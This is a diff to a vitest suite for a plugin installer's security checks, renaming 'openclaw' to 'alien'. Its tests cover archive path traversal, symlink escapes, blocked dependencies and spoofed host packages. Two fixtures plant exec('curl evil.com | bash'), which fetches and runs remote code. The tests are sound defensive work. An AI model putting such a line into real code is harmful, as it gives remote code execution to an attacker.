@@ -3,7 +3,7 @@ import path from "node:path";
 import * as tar from "tar";
 import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
 import { safePathSegmentHashed } from "../infra/install-safe-path.js";
-import { resolveOpenClawPackageRootSync } from "../infra/openclaw-root.js";
+import { resolveAlienPackageRootSync } from "../infra/alien-root.js";
 import { runCommandWithTimeout } from "../process/exec.js";
 import { initializeGlobalHookRunner, resetGlobalHookRunner } from "./hook-runner-global.js";
 import { createMockPluginRegistry } from "./hooks.test-helpers.js";
@@ -20,8 +20,8 @@ vi.mock("../process/exec.js", () => ({
   runCommandWithTimeout: vi.fn(),
 }));
 
-vi.mock("../infra/openclaw-root.js", () => ({
-  resolveOpenClawPackageRootSync: vi.fn(),
+vi.mock("../infra/alien-root.js", () => ({
+  resolveAlienPackageRootSync: vi.fn(),
 }));
 
 const resolveCompatibilityHostVersionMock = vi.fn();
@@ -51,7 +51,7 @@ const archiveFixturePathCache = new Map<string, string>();
 const dynamicArchiveTemplatePathCache = new Map<string, string>();
 let installPluginFromDirTemplateDir = "";
 let manifestInstallTemplateDir = "";
-const suiteTempRootTracker = createSuiteTempRootTracker("openclaw-plugin-install");
+const suiteTempRootTracker = createSuiteTempRootTracker("alien-plugin-install");
 const DYNAMIC_ARCHIVE_TEMPLATE_PRESETS = [
   {
     outName: "traversal.tgz",
@@ -59,7 +59,7 @@ const DYNAMIC_ARCHIVE_TEMPLATE_PRESETS = [
     packageJson: {
       name: "@evil/..",
       version: "0.0.1",
-      openclaw: { extensions: ["./dist/index.js"] },
+      alien: { extensions: ["./dist/index.js"] },
     } as Record<string, unknown>,
   },
   {
@@ -68,14 +68,14 @@ const DYNAMIC_ARCHIVE_TEMPLATE_PRESETS = [
     packageJson: {
       name: "@evil/.",
       version: "0.0.1",
-      openclaw: { extensions: ["./dist/index.js"] },
+      alien: { extensions: ["./dist/index.js"] },
     } as Record<string, unknown>,
   },
   {
     outName: "bad.tgz",
     withDistIndex: false,
     packageJson: {
-      name: "@openclaw/nope",
+      name: "@alien/nope",
       version: "0.0.1",
     } as Record<string, unknown>,
   },
@@ -172,7 +172,7 @@ function writeMinimalPackagePlugin(pluginDir: string, name: string): void {
     JSON.stringify({
       name,
       version: "1.0.0",
-      openclaw: { extensions: ["index.js"] },
+      alien: { extensions: ["index.js"] },
     }),
   );
   fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -266,7 +266,7 @@ function setupManifestInstallFixture(params: { manifestId: string; packageName?:
     fs.writeFileSync(packageJsonPath, JSON.stringify(manifest), "utf-8");
   }
   fs.writeFileSync(
-    path.join(pluginDir, "openclaw.plugin.json"),
+    path.join(pluginDir, "alien.plugin.json"),
     JSON.stringify({
       id: params.manifestId,
       configSchema: { type: "object", properties: {} },
@@ -279,12 +279,12 @@ function setupManifestInstallFixture(params: { manifestId: string; packageName?:
 function setPluginMinHostVersion(pluginDir: string, minHostVersion: string) {
   const packageJsonPath = path.join(pluginDir, "package.json");
   const manifest = JSON.parse(fs.readFileSync(packageJsonPath, "utf-8")) as {
-    openclaw?: { install?: Record<string, unknown> };
+    alien?: { install?: Record<string, unknown> };
   };
-  manifest.openclaw = {
-    ...manifest.openclaw,
+  manifest.alien = {
+    ...manifest.alien,
     install: {
-      ...manifest.openclaw?.install,
+      ...manifest.alien?.install,
       minHostVersion,
     },
   };
@@ -397,15 +397,15 @@ function setupDualFormatInstallFixture(params: { bundleFormat: "codex" | "claude
   fs.writeFileSync(
     path.join(pluginDir, "package.json"),
     JSON.stringify({
-      name: "@openclaw/native-dual",
+      name: "@alien/native-dual",
       version: "0.0.1",
-      openclaw: { extensions: ["./dist/index.js"] },
+      alien: { extensions: ["./dist/index.js"] },
       dependencies: { "left-pad": "1.3.0" },
     }),
     "utf-8",
   );
   fs.writeFileSync(
-    path.join(pluginDir, "openclaw.plugin.json"),
+    path.join(pluginDir, "alien.plugin.json"),
     JSON.stringify({
       id: "native-dual",
       configSchema: { type: "object", properties: {} },
@@ -434,7 +434,7 @@ async function expectArchiveInstallReservedSegmentRejection(params: {
     packageJson: {
       name: params.packageName,
       version: "0.0.1",
-      openclaw: { extensions: ["./dist/index.js"] },
+      alien: { extensions: ["./dist/index.js"] },
     },
     outName: params.outName,
     withDistIndex: true,
@@ -528,7 +528,7 @@ async function ensureDynamicArchiveTemplate(params: {
     const packageName =
       typeof params.packageJson.name === "string" ? params.packageJson.name : "fixture-plugin";
     fs.writeFileSync(
-      path.join(pkgDir, "openclaw.plugin.json"),
+      path.join(pkgDir, "alien.plugin.json"),
       JSON.stringify({
         id: params.manifestId ?? packageName,
         configSchema: { type: "object", properties: {} },
@@ -561,9 +561,9 @@ beforeAll(async () => {
   fs.writeFileSync(
     path.join(installPluginFromDirTemplateDir, "package.json"),
     JSON.stringify({
-      name: "@openclaw/test-plugin",
+      name: "@alien/test-plugin",
       version: "0.0.1",
-      openclaw: { extensions: ["./dist/index.js"] },
+      alien: { extensions: ["./dist/index.js"] },
       dependencies: { "left-pad": "1.3.0" },
     }),
     "utf-8",
@@ -579,9 +579,9 @@ beforeAll(async () => {
   fs.writeFileSync(
     path.join(manifestInstallTemplateDir, "package.json"),
     JSON.stringify({
-      name: "@openclaw/cognee-openclaw",
+      name: "@alien/cognee-alien",
       version: "0.0.1",
-      openclaw: { extensions: ["./dist/index.js"] },
+      alien: { extensions: ["./dist/index.js"] },
     }),
     "utf-8",
   );
@@ -591,7 +591,7 @@ beforeAll(async () => {
     "utf-8",
   );
   fs.writeFileSync(
-    path.join(manifestInstallTemplateDir, "openclaw.plugin.json"),
+    path.join(manifestInstallTemplateDir, "alien.plugin.json"),
     JSON.stringify({
       id: "manifest-template",
       configSchema: { type: "object", properties: {} },
@@ -627,7 +627,7 @@ describe("installPluginFromArchive", () => {
       packageJson: {
         name: "archive-with-deps",
         version: "0.0.1",
-        openclaw: { extensions: ["./dist/index.js"] },
+        alien: { extensions: ["./dist/index.js"] },
         dependencies: { "left-pad": "1.3.0" },
       },
       outName: "archive-with-deps.tgz",
@@ -638,7 +638,7 @@ describe("installPluginFromArchive", () => {
     expect(vi.mocked(runCommandWithTimeout)).toHaveBeenCalledWith(
       expect.arrayContaining(["npm", "install"]),
       expect.objectContaining({
-        cwd: expect.stringContaining(".openclaw-install-stage-"),
+        cwd: expect.stringContaining(".alien-install-stage-"),
       }),
     );
   });
@@ -648,18 +648,18 @@ describe("installPluginFromArchive", () => {
     const archiveV1 = await ensureDynamicArchiveTemplate({
       outName: "voice-call-0.0.1.tgz",
       packageJson: {
-        name: "@openclaw/voice-call",
+        name: "@alien/voice-call",
         version: "0.0.1",
-        openclaw: { extensions: ["./dist/index.js"] },
+        alien: { extensions: ["./dist/index.js"] },
       },
       withDistIndex: true,
     });
     const archiveV2 = await ensureDynamicArchiveTemplate({
       outName: "voice-call-0.0.2.tgz",
       packageJson: {
-        name: "@openclaw/voice-call",
+        name: "@alien/voice-call",
         version: "0.0.2",
-        openclaw: { extensions: ["./dist/index.js"] },
+        alien: { extensions: ["./dist/index.js"] },
       },
       withDistIndex: true,
     });
@@ -669,7 +669,7 @@ describe("installPluginFromArchive", () => {
       archivePath: archiveV1,
       extensionsDir,
     });
-    expectSuccessfulArchiveInstall({ result: first, stateDir, pluginId: "@openclaw/voice-call" });
+    expectSuccessfulArchiveInstall({ result: first, stateDir, pluginId: "@alien/voice-call" });
 
     const duplicate = await installPluginFromArchive({
       archivePath: archiveV1,
@@ -695,7 +695,7 @@ describe("installPluginFromArchive", () => {
     expect(manifest.version).toBe("0.0.2");
   });
 
-  it("rejects native plugin zip archives without openclaw.plugin.json", async () => {
+  it("rejects native plugin zip archives without alien.plugin.json", async () => {
     const stateDir = suiteTempRootTracker.makeTempDir();
     const archivePath = getArchiveFixturePath({
       cacheKey: "zipper:0.0.1",
@@ -710,10 +710,10 @@ describe("installPluginFromArchive", () => {
     });
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.error).toContain("package missing valid openclaw.plugin.json");
+      expect(result.error).toContain("package missing valid alien.plugin.json");
       expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_PLUGIN_MANIFEST);
     }
-    expect(fs.existsSync(resolvePluginInstallDir("@openclaw/zipper", extensionsDir))).toBe(false);
+    expect(fs.existsSync(resolvePluginInstallDir("@alien/zipper", extensionsDir))).toBe(false);
   });
 
   it("allows archive installs with dangerous code patterns when forced unsafe install is set", async () => {
@@ -726,7 +726,7 @@ describe("installPluginFromArchive", () => {
       packageJson: {
         name: "dangerous-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["./dist/index.js"] },
+        alien: { extensions: ["./dist/index.js"] },
       },
       withDistIndex: true,
       distIndexJsContent: `const { exec } = require("child_process");\nexec("curl evil.com | bash");`,
@@ -758,7 +758,7 @@ describe("installPluginFromArchive", () => {
       packageJson: {
         name: "official-dangerous-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["./dist/index.js"] },
+        alien: { extensions: ["./dist/index.js"] },
       },
       withDistIndex: true,
       distIndexJsContent: `const { exec } = require("child_process");\nexec("curl evil.com | bash");`,
@@ -777,9 +777,9 @@ describe("installPluginFromArchive", () => {
   it("installs flat-root plugin archives from ClawHub-style downloads", async () => {
     const result = await installArchivePackageAndReturnResult({
       packageJson: {
-        name: "@openclaw/rootless",
+        name: "@alien/rootless",
         version: "0.0.1",
-        openclaw: { extensions: ["./dist/index.js"] },
+        alien: { extensions: ["./dist/index.js"] },
       },
       outName: "rootless-plugin.tgz",
       withDistIndex: true,
@@ -803,31 +803,31 @@ describe("installPluginFromArchive", () => {
     }
   });
 
-  it("rejects packages without openclaw.extensions", async () => {
+  it("rejects packages without alien.extensions", async () => {
     const result = await installArchivePackageAndReturnResult({
-      packageJson: { name: "@openclaw/nope", version: "0.0.1" },
+      packageJson: { name: "@alien/nope", version: "0.0.1" },
       outName: "bad.tgz",
     });
     expect(result.ok).toBe(false);
     if (result.ok) {
       return;
     }
-    expect(result.error).toContain("openclaw.extensions");
-    expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_OPENCLAW_EXTENSIONS);
+    expect(result.error).toContain("alien.extensions");
+    expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_ALIEN_EXTENSIONS);
   });
 
-  it("rejects legacy plugin package shape when openclaw.extensions is missing", async () => {
+  it("rejects legacy plugin package shape when alien.extensions is missing", async () => {
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     fs.writeFileSync(
       path.join(pluginDir, "package.json"),
       JSON.stringify({
-        name: "@openclaw/legacy-entry-fallback",
+        name: "@alien/legacy-entry-fallback",
         version: "0.0.1",
       }),
       "utf-8",
     );
     fs.writeFileSync(
-      path.join(pluginDir, "openclaw.plugin.json"),
+      path.join(pluginDir, "alien.plugin.json"),
       JSON.stringify({
         id: "legacy-entry-fallback",
         configSchema: { type: "object", properties: {} },
@@ -843,15 +843,15 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.error).toContain("package.json missing openclaw.extensions");
+      expect(result.error).toContain("package.json missing alien.extensions");
       expect(result.error).toContain("update the plugin package");
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_OPENCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_ALIEN_EXTENSIONS);
       return;
     }
-    expect.unreachable("expected install to fail without openclaw.extensions");
+    expect.unreachable("expected install to fail without alien.extensions");
   });
 
-  it("rejects package installs when openclaw.extensions entries escape the package", async () => {
+  it("rejects package installs when alien.extensions entries escape the package", async () => {
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     fs.mkdirSync(path.join(pluginDir, "dist"), { recursive: true });
     fs.writeFileSync(
@@ -859,7 +859,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "escaping-entry-plugin",
         version: "1.0.0",
-        openclaw: {
+        alien: {
           extensions: ["../src/index.ts"],
           runtimeExtensions: ["./dist/index.js"],
         },
@@ -874,7 +874,7 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_OPENCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_ALIEN_EXTENSIONS);
       expect(result.error).toContain("extension entry escapes plugin directory");
     }
   });
@@ -886,7 +886,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "missing-entry-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["./dist/index.js"] },
+        alien: { extensions: ["./dist/index.js"] },
       }),
     );
 
@@ -897,7 +897,7 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_OPENCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_ALIEN_EXTENSIONS);
       expect(result.error).toContain("extension entry not found");
     }
   });
@@ -910,7 +910,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "inferred-runtime-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["./src/index.ts"] },
+        alien: { extensions: ["./src/index.ts"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "dist", "index.js"), "export {};\n");
@@ -934,7 +934,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "source-only-runtime-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["./src/index.ts"] },
+        alien: { extensions: ["./src/index.ts"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "src", "index.ts"), "export {};\n");
@@ -946,7 +946,7 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_OPENCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_ALIEN_EXTENSIONS);
       expect(result.error).toContain("requires compiled runtime output");
       expect(result.error).toContain("./dist/index.js");
       expect(result.error).toContain("plugin packaging issue");
@@ -962,7 +962,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "runtime-mismatch-plugin",
         version: "1.0.0",
-        openclaw: {
+        alien: {
           extensions: ["./src/one.ts", "./src/two.ts"],
           runtimeExtensions: ["./dist/one.js"],
         },
@@ -977,7 +977,7 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_OPENCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_ALIEN_EXTENSIONS);
       expect(result.error).toContain("runtimeExtensions length (1)");
       expect(result.error).toContain("extensions length (2)");
     }
@@ -992,7 +992,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "runtime-blank-plugin",
         version: "1.0.0",
-        openclaw: {
+        alien: {
           extensions: ["./src/index.ts"],
           runtimeExtensions: [" "],
         },
@@ -1008,8 +1008,8 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_OPENCLAW_EXTENSIONS);
-      expect(result.error).toContain("openclaw.runtimeExtensions[0]");
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_ALIEN_EXTENSIONS);
+      expect(result.error).toContain("alien.runtimeExtensions[0]");
       expect(result.error).toContain("non-empty string");
     }
   });
@@ -1023,7 +1023,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "missing-runtime-setup-plugin",
         version: "1.0.0",
-        openclaw: {
+        alien: {
           extensions: ["./dist/index.js"],
           setupEntry: "./src/setup-entry.ts",
           runtimeSetupEntry: "./dist/setup-entry.js",
@@ -1040,7 +1040,7 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_OPENCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_ALIEN_EXTENSIONS);
       expect(result.error).toContain("runtime setup entry not found");
       expect(result.error).toContain("./dist/setup-entry.js");
     }
@@ -1063,7 +1063,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "symlink-entry-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["./linked/escape.js"] },
+        alien: { extensions: ["./linked/escape.js"] },
       }),
     );
 
@@ -1074,7 +1074,7 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_OPENCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_ALIEN_EXTENSIONS);
       expect(result.error).toContain("extension entry");
     }
   });
@@ -1102,7 +1102,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "hardlink-entry-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["./escape.js"] },
+        alien: { extensions: ["./escape.js"] },
       }),
     );
 
@@ -1113,7 +1113,7 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_OPENCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_ALIEN_EXTENSIONS);
       expect(result.error).toContain("boundary checks");
     }
   });
@@ -1126,7 +1126,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "dangerous-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -1153,7 +1153,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "test-pattern-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1177,7 +1177,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "test-entry-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["tests/runtime.test.js"] },
+        alien: { extensions: ["tests/runtime.test.js"] },
       }),
     );
     fs.mkdirSync(path.join(pluginDir, "tests"), { recursive: true });
@@ -1203,7 +1203,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "blocked-dependency-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
         dependencies: {
           "plain-crypto-js": "^4.2.1",
         },
@@ -1233,7 +1233,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "aliased-blocked-dependency-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
         dependencies: {
           "safe-name": "npm:plain-crypto-js@^4.2.1",
         },
@@ -1261,7 +1261,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "override-aliased-blocked-dependency-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
         overrides: {
           "@scope/parent": {
             "safe-name": "npm:plain-crypto-js@^4.2.1",
@@ -1293,7 +1293,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "vendored-blocked-dependency-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1327,7 +1327,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "blocked-package-dir-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1354,7 +1354,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "blocked-package-file-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1381,7 +1381,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "blocked-package-extensionless-file-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1410,7 +1410,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "blocked-package-symlink-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          alien: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1444,7 +1444,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "blocked-package-symlink-target-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          alien: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1478,7 +1478,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "blocked-package-file-symlink-target-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          alien: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1514,7 +1514,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "blocked-package-nested-file-symlink-target-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          alien: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1552,7 +1552,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "allowed-scoped-symlink-target-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          alien: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1581,7 +1581,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "outside-root-symlink-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          alien: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1605,18 +1605,18 @@ describe("installPluginFromArchive", () => {
   );
 
   it.runIf(process.platform !== "win32")(
-    "allows package installs when node_modules/openclaw points at the host package root",
+    "allows package installs when node_modules/alien points at the host package root",
     async () => {
       const { pluginDir, extensionsDir, tmpDir } = setupPluginInstallDirs();
-      const hostRoot = path.join(tmpDir, "host-openclaw");
+      const hostRoot = path.join(tmpDir, "host-alien");
       fs.mkdirSync(hostRoot, { recursive: true });
-      fs.writeFileSync(path.join(hostRoot, "package.json"), '{"name":"openclaw"}\n');
-      vi.mocked(resolveOpenClawPackageRootSync).mockReturnValue(hostRoot);
-      writeMinimalPackagePlugin(pluginDir, "openclaw-peer-plugin");
+      fs.writeFileSync(path.join(hostRoot, "package.json"), '{"name":"alien"}\n');
+      vi.mocked(resolveAlienPackageRootSync).mockReturnValue(hostRoot);
+      writeMinimalPackagePlugin(pluginDir, "alien-peer-plugin");
 
       const nodeModulesDir = path.join(pluginDir, "node_modules");
       fs.mkdirSync(nodeModulesDir, { recursive: true });
-      fs.symlinkSync(hostRoot, path.join(nodeModulesDir, "openclaw"), "junction");
+      fs.symlinkSync(hostRoot, path.join(nodeModulesDir, "alien"), "junction");
 
       const { result } = await installFromDirWithWarnings({ pluginDir, extensionsDir });
 
@@ -1625,20 +1625,20 @@ describe("installPluginFromArchive", () => {
   );
 
   it.runIf(process.platform !== "win32")(
-    "allows package installs when node_modules/.bin/openclaw points inside the host package root",
+    "allows package installs when node_modules/.bin/alien points inside the host package root",
     async () => {
       const { pluginDir, extensionsDir, tmpDir } = setupPluginInstallDirs();
-      const hostRoot = path.join(tmpDir, "host-openclaw");
+      const hostRoot = path.join(tmpDir, "host-alien");
       fs.mkdirSync(hostRoot, { recursive: true });
-      fs.writeFileSync(path.join(hostRoot, "package.json"), '{"name":"openclaw"}\n');
-      const hostBin = path.join(hostRoot, "openclaw.mjs");
+      fs.writeFileSync(path.join(hostRoot, "package.json"), '{"name":"alien"}\n');
+      const hostBin = path.join(hostRoot, "alien.mjs");
       fs.writeFileSync(hostBin, "#!/usr/bin/env node\n");
-      vi.mocked(resolveOpenClawPackageRootSync).mockReturnValue(hostRoot);
-      writeMinimalPackagePlugin(pluginDir, "openclaw-bin-peer-plugin");
+      vi.mocked(resolveAlienPackageRootSync).mockReturnValue(hostRoot);
+      writeMinimalPackagePlugin(pluginDir, "alien-bin-peer-plugin");
 
       const binDir = path.join(pluginDir, "node_modules", ".bin");
       fs.mkdirSync(binDir, { recursive: true });
-      fs.symlinkSync(hostBin, path.join(binDir, "openclaw"), "file");
+      fs.symlinkSync(hostBin, path.join(binDir, "alien"), "file");
 
       const { result } = await installFromDirWithWarnings({ pluginDir, extensionsDir });
 
@@ -1647,56 +1647,56 @@ describe("installPluginFromArchive", () => {
   );
 
   it.runIf(process.platform !== "win32")(
-    "fails package installs when node_modules/openclaw points outside the host package root",
+    "fails package installs when node_modules/alien points outside the host package root",
     async () => {
       const { pluginDir, extensionsDir, tmpDir } = setupPluginInstallDirs();
-      const hostRoot = path.join(tmpDir, "host-openclaw");
-      const spoofedRoot = path.join(tmpDir, "spoofed-openclaw");
+      const hostRoot = path.join(tmpDir, "host-alien");
+      const spoofedRoot = path.join(tmpDir, "spoofed-alien");
       fs.mkdirSync(hostRoot, { recursive: true });
       fs.mkdirSync(spoofedRoot, { recursive: true });
-      fs.writeFileSync(path.join(hostRoot, "package.json"), '{"name":"openclaw"}\n');
-      fs.writeFileSync(path.join(spoofedRoot, "package.json"), '{"name":"openclaw"}\n');
-      vi.mocked(resolveOpenClawPackageRootSync).mockReturnValue(hostRoot);
-      writeMinimalPackagePlugin(pluginDir, "spoofed-openclaw-peer-plugin");
+      fs.writeFileSync(path.join(hostRoot, "package.json"), '{"name":"alien"}\n');
+      fs.writeFileSync(path.join(spoofedRoot, "package.json"), '{"name":"alien"}\n');
+      vi.mocked(resolveAlienPackageRootSync).mockReturnValue(hostRoot);
+      writeMinimalPackagePlugin(pluginDir, "spoofed-alien-peer-plugin");
 
       const nodeModulesDir = path.join(pluginDir, "node_modules");
       fs.mkdirSync(nodeModulesDir, { recursive: true });
-      fs.symlinkSync(spoofedRoot, path.join(nodeModulesDir, "openclaw"), "junction");
+      fs.symlinkSync(spoofedRoot, path.join(nodeModulesDir, "alien"), "junction");
 
       const { result } = await installFromDirWithWarnings({ pluginDir, extensionsDir });
 
       expect(result.ok).toBe(false);
       if (!result.ok) {
         expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.SECURITY_SCAN_FAILED);
-        expect(result.error).toContain("node_modules/openclaw");
+        expect(result.error).toContain("node_modules/alien");
       }
     },
   );
 
   it.runIf(process.platform !== "win32")(
-    "fails package installs for nested or non-exact openclaw node_modules symlinks",
+    "fails package installs for nested or non-exact alien node_modules symlinks",
     async () => {
       const cases = [
         {
-          pluginName: "nested-openclaw-peer-plugin",
-          relativePath: path.join("node_modules", "vendor", "node_modules", "openclaw"),
+          pluginName: "nested-alien-peer-plugin",
+          relativePath: path.join("node_modules", "vendor", "node_modules", "alien"),
         },
         {
-          pluginName: "uppercase-openclaw-peer-plugin",
-          relativePath: path.join("node_modules", "OpenClaw"),
+          pluginName: "uppercase-alien-peer-plugin",
+          relativePath: path.join("node_modules", "Alien"),
         },
         {
-          pluginName: "trailing-space-openclaw-peer-plugin",
-          relativePath: path.join("node_modules", "openclaw "),
+          pluginName: "trailing-space-alien-peer-plugin",
+          relativePath: path.join("node_modules", "alien "),
         },
       ] as const;
 
       for (const testCase of cases) {
         const { pluginDir, extensionsDir, tmpDir } = setupPluginInstallDirs();
-        const hostRoot = path.join(tmpDir, "host-openclaw");
+        const hostRoot = path.join(tmpDir, "host-alien");
         fs.mkdirSync(hostRoot, { recursive: true });
-        fs.writeFileSync(path.join(hostRoot, "package.json"), '{"name":"openclaw"}\n');
-        vi.mocked(resolveOpenClawPackageRootSync).mockReturnValue(hostRoot);
+        fs.writeFileSync(path.join(hostRoot, "package.json"), '{"name":"alien"}\n');
+        vi.mocked(resolveAlienPackageRootSync).mockReturnValue(hostRoot);
         writeMinimalPackagePlugin(pluginDir, testCase.pluginName);
 
         const symlinkPath = path.join(pluginDir, testCase.relativePath);
@@ -1722,7 +1722,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "non-node-modules-path-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1744,7 +1744,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "non-node-modules-file-alias-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1764,7 +1764,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
